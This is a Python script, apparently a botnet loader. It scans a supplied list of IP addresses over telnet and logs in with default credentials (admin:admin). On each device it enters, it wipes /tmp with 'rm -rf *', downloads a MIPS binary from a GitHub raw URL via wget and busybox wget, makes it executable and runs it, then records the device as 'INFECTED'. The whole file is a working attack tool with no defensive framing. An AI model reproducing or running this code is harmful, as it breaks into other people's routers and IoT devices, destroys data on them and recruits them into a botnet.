import threading
import sys
import os
import time
import socket
import select
from queue import Queue
from sys import stdout

p1 = "wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
p2 = "busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
p3 = "/bin/busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
p4 = "chmod 777 mips; ./mips"

if len(sys.argv) < 4:
    print(f"Usage: python {sys.argv[0]} <list> <threads> <output file>")
    sys.exit()

combo = ["admin:admin"]
ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
    queue_count += 1
    stdout.write(f"\r[{queue_count}] Added to queue")
    stdout.flush()
    queue.put(ip.strip())
print("\n")

def read_until(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024).decode()
        time.sleep(0.1)
        if string in buf:
            return buf
    raise Exception('TIMEOUT!')

def recv_timeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data.decode()
    return ""

class VbrXmr(threading.Thread):
    def __init__(self, ip):
        super().__init__()
        self.ip = ip

    def run(self):
        global fh
        username, password = "", ""
        for passwd in combo:
            if ":n/a" in passwd:
                password = ""
            else:
                password = passwd.split(":")[1]
            if "n/a:" in passwd:
                username = ""
            else:
                username = passwd.split(":")[0]

            try:
                tn = socket.socket()
                tn.settimeout(1)
                tn.connect((self.ip, 23))
            except Exception:
                continue

            try:
                XDSL_BCM = read_until(tn, ":")
                if ":" in XDSL_BCM:
                    tn.send((username + "\n").encode())
                    time.sleep(0.09)
            except Exception:
                tn.close()
                continue
            
            try:
                XDSL_BCM = read_until(tn, ":")
                if ":" in XDSL_BCM:
                    tn.send((password + "\n").encode())
                    time.sleep(0.8)
            except Exception:
                tn.close()
                continue

            try:
                prompt = tn.recv(40960).decode()
                success = any(s in prompt for s in [">", "#", "$", "root@"])
                if success:
                    print(f"[XDSL_BCM] LOGIN FOUND - {self.ip} [{username}:{password}]")
                    fh.write(f"{self.ip}:23 {username}:{password}\n")
                    fh.flush()
                    tn.send("sh\r\n".encode())
                    time.sleep(0.1)
                    tn.send("shell\r\n".encode())
                    time.sleep(0.1)
                    tn.send("ls /\r\n".encode())
                    time.sleep(1)
                    
                    timeout = 8
                    buf = ''
                    start_time = time.time()
                    while time.time() - start_time < timeout:
                        buf += recv_timeout(tn, 40960)
                        time.sleep(0.1)
                        if "tmp" in buf and "unrecognized" not in buf:
                            tn.send("sh\n".encode())
                            time.sleep(1)
                            tn.send("cd /tmp\n".encode())
                            tn.send("rm -rf *\n".encode())
                            tn.send((p1 + "\n").encode())
                            tn.send((p2 + "\n").encode())
                            tn.send((p3 + "\n").encode())
                            tn.send((p4 + "\n").encode())
                            print(f"[XDSL_BCM] INFECTED - {self.ip} [{username}:{password}]")
                            with open("xdsl_bcm.txt", "a") as f:
                                f.write(f"{self.ip}:23 {username}:{password}\n")
                            time.sleep(10)
                            tn.close()
                            break
                    tn.close()
            except Exception:
                tn.close()

def worker():
    while True:
        try:
            IP = queue.get()
            thread = VbrXmr(IP)
            thread.start()
            queue.task_done()
            time.sleep(0.02)
        except Exception:
            pass

fh = open(output_file, "a")
for _ in range(threads):
    threading.Thread(target=worker).start()

input("Press Enter to exit...")  # Replaced raw_input with input
os.kill(os.getpid(), 9)
